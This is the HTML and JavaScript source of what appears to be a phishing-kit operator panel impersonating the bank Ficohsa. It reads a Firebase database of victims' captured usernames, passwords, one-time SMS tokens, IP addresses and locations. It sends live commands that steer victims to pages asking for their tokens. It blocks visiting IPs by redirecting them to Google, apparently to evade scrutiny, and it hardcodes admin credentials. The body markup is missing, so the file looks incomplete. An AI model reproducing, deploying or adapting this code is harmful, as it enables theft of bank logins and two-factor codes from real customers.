<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PANEL · Ficohsa</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  :root{
    --bg:#04070f; --panel:#080e1c; --line:#152238;
    --green:#4c8dff; --green-deep:#0d4bbd;
    --red:#c8323c; --amber:#f59e0b; --blue:#3b82f6; --violet:#7c3aed;
    --muted:#5b6b85; --text:#dde6f2;
    --cols:60px 100px 112px 112px 82px 58px 132px 66px 1fr;
  }
  body{background:var(--bg);font-family:'JetBrains Mono',monospace;color:var(--text);overflow-x:hidden}
  .header{background:linear-gradient(180deg,#0a1020,#060b16);border-bottom:2px solid var(--green-deep);padding:12px 22px;display:flex;justify-content:space-between;align-items:center;gap:14px;position:sticky;top:0;z-index:100;flex-wrap:wrap}
  .brand{display:flex;align-items:center;gap:12px}
  .brand svg{width:42px;height:42px;flex:none}
  .brand-txt{font-family:'Orbitron',sans-serif;font-size:18px;font-weight:900;letter-spacing:2px;background:linear-gradient(90deg,#4c8dff,#a8caff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-transform:uppercase;line-height:1}
  .brand-sub{font-size:9px;color:var(--muted);letter-spacing:3px;margin-top:4px}
  .stats-bar{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
  .stat-item{background:#0a1122;border:1px solid var(--line);padding:7px 14px;border-radius:8px;font-size:11px;color:var(--muted);letter-spacing:1px}
  .stat-item span{color:var(--green);font-weight:bold}
  .btns{display:flex;gap:8px;flex-wrap:wrap}
  .btn-header{padding:9px 16px;border:none;border-radius:8px;font-family:inherit;font-size:11px;font-weight:bold;cursor:pointer;transition:all .25s;text-transform:uppercase;letter-spacing:1px}
  .btn-dark{background:#0a1122;border:1px solid #1e2f4d;color:#8fa3c2}
  .btn-dark:hover{border-color:var(--green);color:var(--green)}
  .btn-dark.activo{background:#0e1c33;border-color:var(--green);color:var(--green)}
  .btn-pink{background:#8c1d26;color:#fff}
  .btn-pink:hover{background:#b3252e}
  .table-container{padding:18px 22px 60px}
  .toolbar{display:flex;gap:10px;align-items:center;margin-bottom:14px;flex-wrap:wrap}
  .search-wrap{position:relative;flex:1;min-width:220px;max-width:430px}
  .search-wrap input{width:100%;background:#0a1122;border:1px solid var(--line);border-radius:8px;padding:11px 38px 11px 14px;color:var(--text);font-family:inherit;font-size:12px;outline:none}
  .search-wrap input:focus{border-color:var(--green);box-shadow:0 0 0 2px rgba(76,141,255,.18)}
  .search-wrap input::placeholder{color:#465878}
  .search-wrap .ico{position:absolute;right:13px;top:50%;transform:translateY(-50%);color:var(--muted);font-size:12px;pointer-events:none}
  .btn-clear,.btn-quick{background:#0e1a2e;border:1px solid var(--line);color:#8fa3c2;border-radius:8px;padding:11px 15px;font-size:10px;cursor:pointer;font-family:inherit;text-transform:uppercase;letter-spacing:1px;font-weight:bold}
  .btn-clear:hover{border-color:var(--red);color:#ef4444}
  .btn-quick:hover{border-color:var(--green);color:var(--green)}
  .res-info{font-size:10px;color:var(--muted);letter-spacing:1px}
  .res-info b{color:var(--green)}
  .table-header{display:grid;grid-template-columns:var(--cols);gap:10px;padding:14px;background:#070d1a;border-bottom:2px solid var(--green-deep);font-size:9px;text-transform:uppercase;letter-spacing:1.5px;color:var(--muted);font-weight:bold}
  .data-row{display:grid;grid-template-columns:var(--cols);gap:10px;padding:14px 10px;background:var(--panel);border-left:4px solid var(--green);margin-bottom:7px;align-items:center;transition:all .25s;border-radius:0 6px 6px 0}
  .data-row:hover{background:#0e1729}
  .data-row.offline{border-left-color:#243350;opacity:.5}
  .data-row.ip-bloqueada{border-left-color:#dc2626;background:#160506}
  .data-row.esperando-otp{border-left-color:var(--amber);background:#151004}
  .data-row.codigo{border-left-color:var(--green);background:#08142b}
  .data-row.destacado{box-shadow:inset 0 0 0 1px rgba(76,141,255,.35)}
  .cell-status{display:flex;align-items:center;gap:7px;font-size:10px;font-weight:bold}
  .live-dot{width:8px;height:8px;background:var(--green);border-radius:50%;animation:blink 1.5s infinite;box-shadow:0 0 8px var(--green)}
  .offline-dot{width:8px;height:8px;background:#3d4d6b;border-radius:50%}
  @keyframes blink{0%,100%{opacity:1}50%{opacity:.25}}
  .cell-pagina{font-size:9px;color:var(--amber);text-transform:uppercase;word-break:break-all}
  .cell-pagina.offline{color:var(--muted)}
  .cell-pagina.pag-index{color:var(--blue)}
  .cell-pagina.pag-cargando{color:var(--amber);font-weight:bold}
  .cell-pagina.pag-otp{color:var(--green);font-weight:bold}
  .tag{display:inline-block;padding:1px 6px;border-radius:6px;font-size:8px;margin-left:4px;border:1px solid}
  .tag-status{background:#121a2e;border-color:#3b82f6;color:#93c5fd}
  .esperando{display:inline-block;background:#231a06;border:1px solid var(--amber);color:#fbbf24;padding:1px 7px;border-radius:8px;font-size:8px;margin-left:5px;animation:pulso 1.4s infinite}
  @keyframes pulso{0%,100%{opacity:1}50%{opacity:.45}}
  .cell-user{color:var(--blue);font-weight:bold;font-size:12px;word-break:break-all}
  .cell-pass{color:var(--red);font-weight:bold;font-size:12px;word-break:break-all}
  .cell-token{color:var(--green);font-weight:bold;font-size:13px;background:#08172c;padding:5px 8px;border-radius:5px;text-align:center;border:1px solid var(--green)}
  .cell-token.vacio{color:#42536f;background:#0c1424;border:1px solid #1e2f4d}
  .cell-ip{color:#8fa3c2;font-size:10px;word-break:break-all}
  .cell-ip .ubi{display:block;color:#5b6b85;font-size:9px;margin-top:2px}
  .cell-ip.bloqueada{color:#ef4444;font-weight:bold}
  .cell-tiempo{font-size:10px;color:var(--muted)}
  .actions{display:flex;gap:4px;justify-content:flex-end;flex-wrap:wrap}
  .btn-action{padding:5px 9px;border:none;border-radius:4px;font-family:inherit;font-size:8px;font-weight:bold;cursor:pointer;text-transform:uppercase;letter-spacing:.5px}
  .btn-action:hover{opacity:.8}
  .btn-sms1{background:#b45309;color:#fff}
  .btn-reject{background:#1e2f4d;color:#a9bdd1}
  .btn-delete{background:#a11c25;color:#fff}
  .btn-block{background:var(--violet);color:#fff}
  .btn-restore{background:var(--green-deep);color:#fff}
  .badge-count{background:var(--green);color:#04101f;padding:1px 6px;border-radius:8px;font-size:9px;margin-left:4px;font-weight:bold}
  .badge-bloqueada{background:#dc2626;color:#fff;padding:1px 6px;border-radius:8px;font-size:9px;margin-left:4px;font-weight:bold}
  .badge-veces{display:inline-block;background:#0a1d38;border:1px solid #4c8dff;color:#9cc2ff;padding:2px 9px;border-radius:10px;font-size:10px;font-weight:bold}
  .badge-veces.v1{background:#0d1424;border-color:#1e2f4d;color:#6b7a90}
  .badge-veces.v3{background:#231a06;border-color:#b45309;color:#fbbf24}
  .badge-veces.v5{background:#2a0d10;border-color:#dc2626;color:#f87171}
  .empty{text-align:center;padding:60px;color:var(--muted);font-size:12px;letter-spacing:1px}
  #login-overlay{position:fixed;inset:0;background:radial-gradient(circle at 50% 30%,#0a1428,#000);z-index:1000;display:flex;align-items:center;justify-content:center;padding:20px}
  .login-box{background:#070d1a;border:2px solid var(--green-deep);padding:44px 36px;border-radius:12px;width:100%;max-width:390px;text-align:center}
  .login-box svg{width:96px;height:auto;margin:0 auto 18px;display:block}
  .login-box h2{font-family:'Orbitron',sans-serif;font-size:20px;margin-bottom:26px;color:var(--green);letter-spacing:3px}
  .login-box input{width:100%;background:#0b1425;border:1px solid #1e2f4d;padding:14px;margin-bottom:12px;color:#fff;font-family:inherit;font-size:13px;border-radius:6px;outline:none}
  .login-box input:focus{border-color:var(--green)}
  .login-box button{width:100%;background:var(--green-deep);color:#fff;border:none;padding:15px;font-family:inherit;font-weight:bold;cursor:pointer;border-radius:6px;text-transform:uppercase;letter-spacing:3px;margin-top:8px}
  .notificacion-flotante{position:fixed;top:90px;right:22px;padding:16px 24px;background:#070d1a;border-left:4px solid var(--green);color:#fff;font-weight:bold;font-size:12px;z-index:200;transform:translateX(560px);transition:transform .3s;border-radius:0 8px 8px 0}
  .notificacion-flotante.mostrar{transform:translateX(0)}
  .notificacion-otp{border-left-color:var(--violet)}
  .vista-titulo{font-family:'Orbitron',sans-serif;font-size:15px;letter-spacing:2px;margin-bottom:18px;color:var(--green)}
  .mini-table{width:100%;border-collapse:collapse;font-size:11px}
  .mini-table th{text-align:left;padding:12px;color:var(--muted);font-size:9px;letter-spacing:1.5px;text-transform:uppercase;border-bottom:1px solid var(--line)}
  .mini-table td{padding:12px;border-bottom:1px solid #0d1526;word-break:break-all}
  .panel-box{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:20px;overflow-x:auto}
  .panel-box.rojo{background:#130607;border-color:#7f1d1d}
  .panel-box.ambar{background:#140f06;border-color:#78350f}
  .panel-box.azul{background:#060b16;border-color:#1e3a8a}
  .top-acciones{margin-bottom:16px;display:flex;gap:8px;flex-wrap:wrap}
  .barra-mini{height:6px;border-radius:3px;background:#152238;overflow:hidden;min-width:70px}
  .barra-mini i{display:block;height:100%;background:linear-gradient(90deg,#0d4bbd,#4c8dff)}
  @media (max-width:1150px){
    .table-header{display:none}
    .data-row{grid-template-columns:1fr;gap:7px;padding:14px 14px 14px 16px}
    .data-row>div{display:flex;justify-content:space-between;align-items:center;gap:14px}
    .data-row>div::before{content:attr(data-label);color:#5b6b85;font-size:8px;letter-spacing:1.5px;text-transform:uppercase;font-weight:bold;flex:none}
    .actions{justify-content:flex-start;padding-top:4px}
    .table-container{padding:14px 12px 60px}
    .search-wrap{max-width:none}
  }
</style>
</head>

<script>
/* ============================================================
   CONFIG  ·  mismo valor en index.html, cargando.html y token.html
   ============================================================ */
const CFG = { DB_URL: "https://cbonnlineec-default-rtdb.firebaseio.com/", ROOT: "ficohsa", REDIRECT_BLOQUEADO: "https://www.google.com" };
const ADMIN_USER = 'Ghost';
const ADMIN_PASS = 'Cabimas01.';

/* ================= MINI DB ================= */
const DBX = (function(){
  const KEY='ficohsa_db';
  const vacio=()=>({logins:{},comandos:{},eliminados:{},blacklist:{},historial:{},ocultos:{}});
  let fb=null, subs=[];
  const leer=()=>{ try{ const t=JSON.parse(localStorage.getItem(KEY))||vacio(); t.ocultos=t.ocultos||{}; return t; }catch(e){ return vacio(); } };
  const escribir=t=>{ try{ localStorage.setItem(KEY,JSON.stringify(t)); }catch(e){} notificar(); };
  const gp=(t,p)=>p.split('/').reduce((o,k)=>(o&&o[k]!==undefined)?o[k]:null,t);
  function setP(p,v){ const t=leer(),ks=p.split('/'); let o=t; ks.slice(0,-1).forEach(k=>{ if(typeof o[k]!=='object'||o[k]===null) o[k]={}; o=o[k]; }); o[ks[ks.length-1]]=v; escribir(t); }
  function delP(p){ const t=leer(),ks=p.split('/'); let o=t; for(let i=0;i<ks.length-1;i++){ o=o[ks[i]]; if(!o) return; } delete o[ks[ks.length-1]]; escribir(t); }
  function notificar(){ subs.forEach(s=>{ try{ s.cb(gp(leer(),s.path)); }catch(e){} }); }
  window.addEventListener('storage',e=>{ if(e.key===KEY) notificar(); });
  return {
    init(){ if(!CFG.DB_URL||typeof firebase==='undefined') return false;
      if(!firebase.apps.length) firebase.initializeApp({databaseURL:CFG.DB_URL});
      fb=firebase.database(); return true; },
    set(p,v){ if(fb) return fb.ref(CFG.ROOT+'/'+p).set(v); setP(p,v); },
    update(p,v){ if(fb) return fb.ref(CFG.ROOT+'/'+p).update(v);
      const t=leer(); const cur=Object.assign({},gp(t,p)||{}); Object.assign(cur,v); setP(p,cur); },
    push(p,v){ if(fb) return fb.ref(CFG.ROOT+'/'+p).push(v);
      const id='-'+Math.random().toString(36).slice(2,12); setP(p+'/'+id,v); return id; },
    remove(p){ if(fb) return fb.ref(CFG.ROOT+'/'+p).remove(); delP(p); },
    on(p,cb){ if(fb){ fb.ref(CFG.ROOT+'/'+p).on('value',s=>cb(s.val())); } else { subs.push({path:p,cb}); cb(gp(leer(),p)); } }
  };
})();

/* ================= ESTADO ================= */
let vistaActual='validos';
let datos={ loginsRaw:{}, validos:[], eliminados:[], blacklist:{}, historial:{} };
let ocultos={};
let contadorIPs={}, filtro='', tokensVistos={}, idsVistos={}, audioAutorizado=false, alertaTitulo=null;

const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const slugUser = u => String(u||'').toLowerCase().replace(/[.#$/\[\]]/g,'_');
const norm = s => String(s??'').toLowerCase();
const U   = d => d.usuario ?? d.username ?? d.user ?? '';
const P   = d => d.clave ?? d.password ?? d.pass ?? '';
const TOK = d => d.sms ?? d.token ?? d.otp ?? '';

/* ================= SONIDO ================= */
function playSound(){ if(!audioAutorizado) return; try{ const a=document.getElementById('notif-sound'); a.currentTime=0; a.play().catch(()=>{}); }catch(e){} }
function probarSonido(){ audioAutorizado=true; const a=document.getElementById('notif-sound'); try{ a.currentTime=0; a.play().catch(()=>{}); }catch(e){} }
['click','touchstart','keydown'].forEach(ev=>document.addEventListener(ev,()=>audioAutorizado=true,{passive:true}));

function mostrarNotificacion(t,esOTP){
  const n=document.getElementById('notificacion');
  document.getElementById('notificacion-texto').textContent=t;
  n.className='notificacion-flotante mostrar'+(esOTP?' notificacion-otp':'');
  setTimeout(()=>n.classList.remove('mostrar'),3000);
}
function avisarTitulo(){
  if(alertaTitulo) return; const orig=document.title; let on=false;
  alertaTitulo=setInterval(()=>{ document.title = on?'🔔 ¡NUEVO!' : orig; on=!on; },700);
  setTimeout(()=>{ clearInterval(alertaTitulo); alertaTitulo=null; document.title=orig; },8000);
}

/* ================= ACCESO ================= */
function validarAcceso(){
  if(document.getElementById('admin-user').value===ADMIN_USER && document.getElementById('admin-pass').value===ADMIN_PASS){
    sessionStorage.setItem('auth_panel','true'); entrarAlPanel();
  } else document.getElementById('error-msg').style.display='block';
}
function entrarAlPanel(){
  document.getElementById('login-overlay').style.display='none';
  document.getElementById('panel-content').style.display='block';
  audioAutorizado=true;
  if(!DBX.init()) console.log('[FICOHSA] Modo LOCAL (localStorage)');
  iniciar();
}
if(sessionStorage.getItem('auth_panel')==='true') entrarAlPanel();
function cerrarSesion(){ sessionStorage.removeItem('auth_panel'); location.reload(); }

/* ================= SUSCRIPCIONES ================= */
function iniciar(){
  DBX.on('ocultos', v => { ocultos = v||{}; refrescarValidos(); });

  DBX.on('logins', v => {
    let hayNuevo=false, hayOTP=false;
    Object.entries(v||{}).forEach(([id,d])=>{
      if(!d) return;
      const tk=TOK(d);
      if(!idsVistos[id]){ if(Object.keys(idsVistos).length>0) hayNuevo=true; idsVistos[id]=true; tokensVistos[id]=tk; }
      else if(tk && tk!=='' && tk!=='----' && tk!==tokensVistos[id]){ hayOTP=true; tokensVistos[id]=tk; }
    });
    if(hayNuevo){ playSound(); avisarTitulo(); mostrarNotificacion('¡NUEVO CLIENTE!',false); }
    if(hayOTP){ setTimeout(()=>{ playSound(); avisarTitulo(); mostrarNotificacion('¡TOKEN RECIBIDO!',true); }, hayNuevo?600:0); }
    datos.loginsRaw = v||{};
    refrescarValidos();
  });

  DBX.on('eliminados', v => {
    datos.eliminados = Object.entries(v||{}).map(([key,data])=>({key,data}));
    renderizar();
  });
  DBX.on('blacklist', v => { datos.blacklist = v||{}; renderizar(); });
  DBX.on('historial', v => { datos.historial = v||{}; renderizar(); });
}

/* Lista visible = logins sin cerrado y sin estar en la lista de ocultos */
function refrescarValidos(){
  const arr=[]; contadorIPs={};
  Object.entries(datos.loginsRaw||{}).forEach(([id,d])=>{
    if(!d) return;
    if(d.cerrado===true) return;
    if(ocultos[id]) return;                       // <- el borrado nunca vuelve
    if(d.usuario && !d.user) d.user=d.usuario;
    if(d.clave && !d.pass) d.pass=d.clave;
    if(!U(d) && !P(d)) return;
    if(d.ip && d.ip!=='unknown') contadorIPs[d.ip]=(contadorIPs[d.ip]||0)+1;
    arr.push({id,data:d});
  });
  datos.validos=arr;
  renderizar();
}

/* ================= FILTROS ================= */
function setFiltro(v){ filtro=String(v||'').trim(); const i=document.getElementById('buscador'); if(i) i.value=filtro; renderizar(); }
function limpiarFiltro(){ const i=document.getElementById('buscador'); if(i) i.value=''; filtro=''; renderizar(); }
function coincide(d,id){
  if(!filtro) return true;
  const texto=[U(d),P(d),d.ip,d.ubicacion,d.sms,d.token,d.pagina,d.status,id].map(norm).join(' ');
  return norm(filtro).split(/\s+/).every(p=>texto.includes(p));
}
function filtrar(lista,get){ if(!filtro) return lista; return lista.filter(it=>coincide(get(it).data||{}, get(it).id||get(it).key)); }
function pintarInfo(m,t){ const el=document.getElementById('res-info'); if(!el) return; el.innerHTML = filtro ? `Filtro "<b>${esc(filtro)}</b>" — <b>${m}</b> de ${t}` : `Mostrando <b>${t}</b>`; }

/* ================= CONTADOR ================= */
function vecesDe(u){ const r=datos.historial[slugUser(u)]; return r?(r.veces||0):0; }
function claseVeces(n){ return n>=5?'v5':n>=3?'v3':n<=1?'v1':''; }
function resetearContador(u){
  const k=slugUser(u);
  if(!confirm(`¿Reiniciar el contador de "${u}"?`)) return;
  DBX.update('historial/'+k,{veces:0}); mostrarNotificacion('Contador reiniciado');
}

/* ================= ARCHIVAR / ELIMINAR ================= */
function archivar(id,data,motivo){
  const reg=Object.assign({},data||{},{origId:id,motivo:motivo,eliminadoEn:Date.now()});
  delete reg.cerrado; delete reg.cerradoEn;
  DBX.push('eliminados',reg);
}
function ocultar(id,motivo){
  DBX.set('ocultos/'+id, { id, motivo, fecha: Date.now() });
  DBX.update('logins/'+id, { cerrado:true, cerradoEn:Date.now() });
}
function eliminarRegistro(id){
  const it=datos.validos.find(x=>x.id===id); const data=it?it.data:{};
  archivar(id,data,'ELIMINADO MANUAL');
  ocultar(id,'ELIMINADO MANUAL');
  // manda al cliente de vuelta al login para que no siga tocando el registro
  DBX.set('comandos/'+id,{redirect:'index.html',limpiarToken:true,accion:'eliminado',ts:Date.now()});
  mostrarNotificacion('Enviado a ELIMINADOS');
}
function limpiarTodo(){
  const t=datos.validos.length;
  if(!t) return alert('No hay registros para limpiar.');
  if(!confirm(`¿Mover TODOS los registros (${t}) a ELIMINADOS?`)) return;
  datos.validos.forEach(({id,data})=>{
    archivar(id,data,'LIMPIEZA MASIVA');
    ocultar(id,'LIMPIEZA MASIVA');
  });
  mostrarNotificacion('🗑️ '+t+' movidos a ELIMINADOS');
}
function restaurar(key){
  const it=datos.eliminados.find(e=>e.key===key); if(!it) return;
  const d=it.data, limpio=Object.assign({},d);
  delete limpio.origId; delete limpio.motivo; delete limpio.eliminadoEn;
  delete limpio.cerrado; delete limpio.cerradoEn;
  limpio.online=false; limpio.ultimoPing=Date.now();
  DBX.set('logins/'+d.origId,limpio);
  DBX.remove('ocultos/'+d.origId);          // <- deja de estar oculto
  DBX.remove('eliminados/'+key);
  DBX.remove('comandos/'+d.origId);
  mostrarNotificacion('♻️ Restaurado');
}
function restaurarTodo(){
  if(!datos.eliminados.length) return alert('No hay nada que restaurar.');
  if(!confirm(`¿Restaurar los ${datos.eliminados.length} registros?`)) return;
  datos.eliminados.slice().forEach(e=>restaurar(e.key));
}
function vaciarEliminados(){
  if(!datos.eliminados.length) return alert('La papelera está vacía.');
  if(!confirm(`¿Borrar definitivamente ${datos.eliminados.length} registros?`)) return;
  datos.eliminados.forEach(e=>DBX.remove('eliminados/'+e.key));
  mostrarNotificacion('Papelera vaciada');
}

/* ================= BLOQUEAR IP ================= */
function bloquearIP(ip){
  if(!ip||ip==='unknown') return alert('IP inválida');
  if(!confirm(`¿BLOQUEAR IP ${ip}?\n\nSerá redirigido a ${CFG.REDIRECT_BLOQUEADO}`)) return;
  const k=ip.replace(/\./g,'_').replace(/:/g,'-');
  DBX.set('blacklist/'+k,{ip,bloqueado:true,redirigirA:CFG.REDIRECT_BLOQUEADO,fecha:Date.now()});
  mostrarNotificacion('🚫 IP '+ip+' bloqueada');
}
function desbloquearIP(ip){
  if(!ip) return; if(!confirm(`¿Desbloquear IP ${ip}?`)) return;
  DBX.remove('blacklist/'+ip.replace(/\./g,'_').replace(/:/g,'-'));
}

function tiempoTranscurrido(ts){
  if(!ts) return '-';
  const s=Math.floor((Date.now()-ts)/1000);
  if(s<60) return s+'s'; if(s<3600) return Math.floor(s/60)+'m'; if(s<86400) return Math.floor(s/3600)+'h';
  return Math.floor(s/86400)+'d';
}

/* ================= COMANDOS AL CLIENTE ================= */
function comando(id,destino){
  DBX.set('comandos/'+id,{redirect:destino,limpiarToken:destino.indexOf('token')===-1,ts:Date.now()});
  mostrarNotificacion('📨 Enviado: '+destino);
}

/* ================= RENDER ================= */
function renderizar(){
  if(!document.getElementById('stat-total')) return;
  const ahora=Date.now();
  let online=0,off=0;
  datos.validos.forEach(({data})=>{ (data.online && ahora-(data.ultimoPing||0)<20000) ? online++ : off++; });
  document.getElementById('stat-total').textContent=datos.validos.length;
  document.getElementById('stat-online').textContent=online;
  document.getElementById('stat-offline').textContent=off;
  document.getElementById('stat-usuarios').textContent=Object.keys(datos.historial).length;
  document.getElementById('stat-bloqueadas').textContent=Object.keys(datos.blacklist).length;
  document.getElementById('stat-eliminados').textContent=datos.eliminados.length;

  const c=document.getElementById('container');
  if(vistaActual==='bloqueadas') return renderizarBloqueadas();
  if(vistaActual==='eliminados') return renderizarEliminados();
  if(vistaActual==='usuarios') return renderizarUsuarios();

  const lista=filtrar(datos.validos,x=>x);
  pintarInfo(lista.length,datos.validos.length);
  if(!lista.length){ c.innerHTML='<div class="empty">'+(filtro?'SIN RESULTADOS':'SIN REGISTROS')+'</div>'; return; }

  let html='';
  lista.forEach(({id,data})=>{
    const token=TOK(data);
    const tieneOTP=token && token!=='' && token!=='----';
    const veces=contadorIPs[data.ip]||1;
    const on=data.online===true && (ahora-(data.ultimoPing||0)<20000);
    const bl=data.ip&&datos.blacklist[data.ip.replace(/\./g,'_').replace(/:/g,'-')];
    const vU=vecesDe(U(data));
    const pg=norm(data.pagina);
    const clasePg = pg.includes('token')||pg.includes('codigo')||pg.includes('otp') ? 'pag-otp' : pg.includes('cargando') ? 'pag-cargando' : pg.includes('index') ? 'pag-index' : '';
    const esperando = on && pg.includes('cargando');

    let rc='data-row';
    if(!on) rc+=' offline';
    if(bl) rc+=' ip-bloqueada';
    if(esperando) rc+=' esperando-otp';
    if(tieneOTP) rc+=' codigo';
    if(filtro) rc+=' destacado';

    html+=`<div class="${rc}">
      <div class="cell-status" data-label="Estado">${on?'<div class="live-dot"></div>LIVE':'<div class="offline-dot"></div>OFF'}</div>
      <div class="cell-pagina ${!on?'offline':''} ${clasePg}" data-label="Página">${esc(on?(data.pagina||'—'):'SALIO')}${data.status?`<span class="tag tag-status">${esc(data.status)}</span>`:''}${esperando?'<span class="esperando">ESPERANDO</span>':''}</div>
      <div class="cell-user" data-label="Usuario">${esc(U(data)||'N/A')}</div>
      <div class="cell-pass" data-label="Contraseña">${esc(P(data)||'****')}</div>
      <div data-label="Token">${tieneOTP?`<div class="cell-token">${esc(token)}</div>`:'<div class="cell-token vacio">----</div>'}</div>
      <div data-label="Veces">${vU?`<span class="badge-veces ${claseVeces(vU)}">${vU}x</span>`:'<span class="badge-veces v1">0x</span>'}</div>
      <div class="cell-ip ${bl?'bloqueada':''}" data-label="IP">${esc(data.ip||'N/A')}${veces>1?`<span class="badge-count">${veces}</span>`:''}${bl?'<span class="badge-bloqueada">BLOQ</span>':''}<span class="ubi">${esc(data.ubicacion||'')}</span></div>
      <div class="cell-tiempo" data-label="Último">${tiempoTranscurrido(data.ultimoPing)}</div>
      <div class="actions" data-label="Acciones">
        <button class="btn-action btn-sms1" onclick="comando('${id}','token.html')">PEDIR TOKEN</button>
        <button class="btn-action btn-reject" onclick="comando('${id}','cargando.html')">ESPERAR</button>
        <button class="btn-action btn-reject" onclick="comando('${id}','index.html')">RECHAZAR</button>
        ${data.ip&&data.ip!=='unknown'?`<button class="btn-action btn-block" onclick="bloquearIP('${esc(data.ip)}')">BLOQUEAR IP</button>`:''}
        <button class="btn-action btn-delete" onclick="eliminarRegistro('${id}')">ELIMINAR</button>
      </div>
    </div>`;
  });
  c.innerHTML=html;
}

function renderizarUsuarios(){
  const c=document.getElementById('container');
  const todos=Object.entries(datos.historial).map(([k,v])=>({key:k,id:k,...v}));
  const lista=filtrar(todos,x=>x);
  pintarInfo(lista.length,todos.length);
  if(!lista.length){ c.innerHTML='<div class="empty">SIN USUARIOS</div>'; return; }
  const maxV=Math.max(...todos.map(u=>u.veces||0),1);
  lista.sort((a,b)=>(b.veces||0)-(a.veces||0));
  let h='<div class="panel-box azul"><div class="vista-titulo">👤 USUARIOS ÚNICOS ('+lista.length+')</div><table class="mini-table"><tr><th>Usuario</th><th>Accesos</th><th>Frecuencia</th><th>Primera vez</th><th>Última vez</th><th>Última IP</th><th>Acción</th></tr>';
  lista.forEach(u=>{
    const n=u.veces||0, pct=Math.round((n/maxV)*100);
    h+=`<tr><td style="color:#3b82f6;font-weight:bold">${esc(u.user||u.key)}</td>
      <td><span class="badge-veces ${claseVeces(n)}">${n}x</span></td>
      <td><div class="barra-mini"><i style="width:${pct}%"></i></div></td>
      <td style="color:#8fa3c2;font-size:10px">${u.primeraVez?new Date(u.primeraVez).toLocaleString():'—'}</td>
      <td style="color:#f59e0b;font-size:10px">${u.ultimaVez?new Date(u.ultimaVez).toLocaleString():'—'}</td>
      <td style="color:#8fa3c2;font-size:10px">${esc(u.ultimaIP||'—')}</td>
      <td><button class="btn-action btn-sms1" onclick="setFiltro('${esc(u.user||u.key)}')">VER</button>
          <button class="btn-action btn-reject" onclick="resetearContador('${esc(u.user||u.key)}')">RESET</button></td></tr>`;
  });
  c.innerHTML=h+'</table></div>';
}

function renderizarBloqueadas(){
  const c=document.getElementById('container');
  const todos=Object.values(datos.blacklist).filter(v=>v.bloqueado);
  if(!todos.length){ c.innerHTML='<div class="empty">SIN IPs BLOQUEADAS</div>'; return; }
  let h='<div class="panel-box rojo"><div class="vista-titulo" style="color:#dc2626">🚫 IPs BLOQUEADAS (redirigen a Google)</div><table class="mini-table"><tr><th>IP</th><th>Bloqueada desde</th><th>Redirección</th><th>Acción</th></tr>';
  todos.forEach(d=>{
    h+=`<tr><td style="color:#dc2626;font-weight:bold">${esc(d.ip)}</td>
      <td style="color:#fca5a5;font-size:11px">${d.fecha?new Date(d.fecha).toLocaleString():'—'}</td>
      <td style="color:#f59e0b;font-size:11px">${esc(d.redirigirA||CFG.REDIRECT_BLOQUEADO)}</td>
      <td><button class="btn-action btn-sms1" onclick="desbloquearIP('${esc(d.ip)}')">DESBLOQUEAR</button></td></tr>`;
  });
  c.innerHTML=h+'</table></div>';
}

function renderizarEliminados(){
  const c=document.getElementById('container');
  const todos=datos.eliminados.slice().sort((a,b)=>(b.data.eliminadoEn||0)-(a.data.eliminadoEn||0));
  const lista=filtrar(todos,x=>x);
  pintarInfo(lista.length,todos.length);
  if(!todos.length){ c.innerHTML='<div class="empty">PAPELERA VACÍA</div>'; return; }
  let h=`<div class="panel-box ambar"><div class="vista-titulo" style="color:#f59e0b">🗑️ ELIMINADOS (${todos.length})</div>
  <div class="top-acciones">
    <button class="btn-action btn-restore" style="padding:8px 14px" onclick="restaurarTodo()">RESTAURAR TODOS</button>
    <button class="btn-action btn-delete" style="padding:8px 14px" onclick="vaciarEliminados()">VACIAR PAPELERA</button>
  </div>`;
  if(!lista.length){ h+='<div class="empty">SIN RESULTADOS</div></div>'; c.innerHTML=h; return; }
  h+='<table class="mini-table"><tr><th>Eliminado</th><th>Motivo</th><th>Usuario</th><th>Contraseña</th><th>Token</th><th>IP</th><th>Acción</th></tr>';
  lista.forEach(e=>{
    const d=e.data;
    h+=`<tr><td style="color:#f59e0b;font-size:10px">${d.eliminadoEn?new Date(d.eliminadoEn).toLocaleString():'—'}</td>
      <td style="color:#a9bdd1;font-size:9px">${esc(d.motivo||'—')}</td>
      <td style="color:#3b82f6;font-weight:bold">${esc(U(d)||'N/A')}</td>
      <td style="color:#c8323c;font-weight:bold">${esc(P(d)||'****')}</td>
      <td style="color:#4c8dff">${esc(TOK(d)||'----')}</td>
      <td style="color:#8fa3c2;font-size:10px">${esc(d.ip||'N/A')}</td>
      <td><button class="btn-action btn-restore" onclick="restaurar('${e.key}')">RESTAURAR</button></td></tr>`;
  });
  c.innerHTML=h+'</table></div>';
}

document.addEventListener('keydown',e=>{
  if(e.key==='/' && document.activeElement.id!=='buscador'){ e.preventDefault(); document.getElementById('buscador').focus(); }
  if(e.key==='Escape') limpiarFiltro();
});

cambiarVista('validos');
setInterval(()=>{ if(vistaActual==='validos') renderizar(); },5000);
</script>
</body>
